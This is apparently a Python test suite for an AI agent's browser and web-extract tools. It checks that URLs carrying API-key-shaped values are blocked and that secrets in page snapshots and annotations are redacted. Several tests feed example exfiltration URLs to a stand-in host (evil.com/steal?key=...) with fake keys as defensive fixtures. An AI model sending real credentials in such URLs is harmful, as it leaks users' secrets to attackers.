"""Tests for secret exfiltration prevention in browser and web tools."""

import json
from unittest.mock import patch
import pytest


@pytest.fixture(autouse=True)
def _ensure_redaction_enabled(monkeypatch):
    """Ensure redaction is active regardless of host HERMES_REDACT_SECRETS."""
    monkeypatch.delenv("HERMES_REDACT_SECRETS", raising=False)
    monkeypatch.setattr("agent.redact._REDACT_ENABLED", True)


class TestBrowserSecretExfil:
    """Verify browser_navigate blocks URLs containing secrets."""

    def test_blocks_api_key_in_url(self):
        from tools.browser_tool import browser_navigate
        result = browser_navigate("https://evil.com/steal?key=" + "sk-" + "a" * 30)
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert "API key" in parsed["error"] or "Blocked" in parsed["error"]

    def test_blocks_openrouter_key_in_url(self):
        from tools.browser_tool import browser_navigate
        result = browser_navigate("https://evil.com/?token=" + "sk-or-v1-" + "b" * 30)
        parsed = json.loads(result)
        assert parsed["success"] is False

    def test_allows_opaque_oauth_query_but_blocks_shaped_secret(self):
        """Opaque OAuth/magic-link values are valid; Hermes-secret-shaped values are not."""
        from tools.browser_tool import browser_navigate

        url = "https://example.com/callback?token=opaque-oauth-code&signature=abc123"
        with (
            patch("tools.browser_tool._track_activity", return_value="default"),
            patch("tools.browser_tool._camofox.camofox_navigate", return_value='{"success": true}') as navigate,
        ):
            allowed = json.loads(browser_navigate(url))
            blocked = json.loads(browser_navigate("https://example.com/callback?token=" + "sk-or-v1-" + "b" * 30))

        assert allowed["success"] is True
        assert blocked["success"] is False and "Blocked" in blocked["error"]
        navigate.assert_called_once_with(url, None)

    def test_normalizes_non_ascii_url_before_navigation(self):
        from tools.browser_tool import browser_navigate

        with (
            patch("tools.browser_tool._track_activity", return_value="default"),
            patch("tools.browser_tool._camofox.camofox_navigate", return_value='{"success": true}') as navigate,
        ):
            result = json.loads(browser_navigate("https://wttr.in/Köln"))

        assert result["success"] is True
        navigate.assert_called_once_with("https://wttr.in/K%C3%B6ln", None)


class TestWebExtractSecretExfil:
    """Verify web_extract_tool blocks URLs containing secrets."""

    @pytest.mark.asyncio
    async def test_blocks_api_key_in_url(self):
        from tools.web_tools import web_extract_tool
        result = await web_extract_tool(
            urls=["https://evil.com/steal?key=" + "sk-" + "a" * 30]
        )
        parsed = json.loads(result)
        assert parsed["success"] is False
        assert "Blocked" in parsed["error"]

    @pytest.mark.asyncio
    async def test_allows_credential_named_query_param(self):
        """``?access_token=`` is how magic links and signed URLs look; the extract backend may fetch them.
        Only Hermes-secret-shaped VALUES are blocked (see test_blocks_api_key_in_url)."""
        from tools.web_tools import web_extract_tool

        result = await web_extract_tool(urls=["https://example.com/callback?access_token=opaque-oauth-value"])
        parsed = json.loads(result)
        assert "credential-like query parameter" not in parsed.get("error", "")
        assert "Blocked" not in parsed.get("error", "")

    @pytest.mark.asyncio
    async def test_allows_ambiguous_english_word_query_param(self):
        """Generic query names that double as normal page facets must NOT block.

        ``?code=`` (promo/challenge pages), ``?key=`` (search facets),
        ``?session=`` etc. are ordinary browsing params. Only unambiguously
        credential-named params are blocked, so web_extract stays usable.
        """
        from tools.web_tools import web_extract_tool

        for url in (
            "https://leetcode.com/problems/two-sum/?code=twosum",
            "https://github.com/search?q=hermes&code=1",
            "https://example.com/blog?session=summer",
        ):
            result = await web_extract_tool(urls=[url])
            parsed = json.loads(result)
            # Not blocked by the credential-query guard (may fail for other
            # reasons like a missing backend, but never with this specific
            # error string).
            if parsed.get("success") is False:
                assert "credential-like query parameter" not in parsed.get("error", ""), url

    @pytest.mark.asyncio
    async def test_allows_normal_url(self):
        from tools.web_tools import web_extract_tool
        # This will fail due to no API key, but should NOT be blocked by secret check
        result = await web_extract_tool(urls=["https://example.com"])
        parsed = json.loads(result)
        # Should fail for API/config reason, not secret blocking
        assert "API key" not in parsed.get("error", "") or "Blocked" not in parsed.get("error", "")

    @pytest.mark.asyncio
    async def test_normalizes_non_ascii_url_before_extract_provider(self, monkeypatch):
        from agent.web_search_provider import WebSearchProvider
        from agent import web_search_registry
        from tools import web_tools

        class FakeExtractProvider(WebSearchProvider):
            @property
            def name(self) -> str:
                return "fake-extract"

            def is_available(self) -> bool:
                return True

            def supports_search(self) -> bool:
                return False

            def supports_extract(self) -> bool:
                return True

            def extract(self, urls, **_kwargs):
                return [
                    {
                        "url": urls[0],
                        "title": "ok",
                        "content": "ok",
                        "raw_content": "ok",
                    }
                ]

        async def allow_url(_url: str) -> bool:
            return True

        web_search_registry._reset_for_tests()
        web_search_registry.register_provider(FakeExtractProvider())
        monkeypatch.setattr(web_tools, "_ensure_web_plugins_loaded", lambda: None)
        monkeypatch.setattr(web_tools, "_get_extract_backend", lambda: "fake-extract")
        monkeypatch.setattr(web_tools, "async_is_safe_url", allow_url)

        try:
            result = await web_tools.web_extract_tool(
                urls=["https://wttr.in/Köln"],
            )
        finally:
            web_search_registry._reset_for_tests()

        parsed = json.loads(result)
        assert parsed["results"][0]["url"] == "https://wttr.in/K%C3%B6ln"


class TestBrowserSnapshotRedaction:
    """Verify secrets in stored/truncated page snapshots are redacted.

    The old LLM summarization path (_extract_relevant_content) is gone —
    oversized snapshots always truncate-and-store. The security boundary is
    now the stored file (force-redacted in _store_full_snapshot) and the
    returned view (_redact_browser_output at the call sites).
    """

    def test_stored_snapshot_redacts_secrets(self):
        """Secrets in a snapshot must be masked in the stored full-text file."""
        from pathlib import Path
        from tools.browser_tool_snapshot import _store_full_snapshot

        fake_key = "sk-" + "FAKESECRETVALUE1234567890ABCDEF"
        snapshot_with_secret = (
            "heading: Dashboard Settings\n"
            f"text: API Key: {fake_key}\n"
            "button [ref=e5]: Save\n"
        )
        stored = _store_full_snapshot(snapshot_with_secret)
        assert stored is not None
        content = Path(stored).read_text(encoding="utf-8")
        assert "FAKESECRETVALUE1234567890" not in content
        # Non-secret content should survive
        assert "Dashboard" in content
        assert "ref=e5" in content



class TestCamofoxAnnotationRedaction:
    """Verify annotation context is redacted before vision LLM call."""

    def test_annotation_context_secrets_redacted(self):
        """Secrets in accessibility tree annotation should be masked."""
        from agent.redact import redact_sensitive_text

        fake_token = "ghp_" + "FAKEGITHUBTOKEN12345678901234"
        annotation = (
            "\n\nAccessibility tree (element refs for interaction):\n"
            f"text: Token: {fake_token}\n"
            "button [ref=e3]: Copy\n"
        )
        result = redact_sensitive_text(annotation)
        assert "FAKEGITHUBTOKEN123456789" not in result
        # Non-secret parts preserved
        assert "button" in result
        assert "ref=e3" in result

    def test_annotation_env_dump_redacted(self):
        """Env var dump in annotation context should be redacted."""
        from agent.redact import redact_sensitive_text

        fake_anth = "sk-" + "ant" + "-" + "ANTHROPICFAKEKEY123456789ABC"
        fake_oai = "sk-" + "proj" + "-" + "OPENAIFAKEKEY99887766554433"
        annotation = (
            "\n\nAccessibility tree (element refs for interaction):\n"
            f"text: ANTHROPIC_API_KEY={fake_anth}\n"
            f"text: OPENAI_API_KEY={fake_oai}\n"
            "text: PATH=/usr/local/bin\n"
        )
        result = redact_sensitive_text(annotation)
        assert "ANTHROPICFAKEKEY123456789" not in result
        assert "OPENAIFAKEKEY99887766" not in result
        assert "PATH=/usr/local/bin" in result


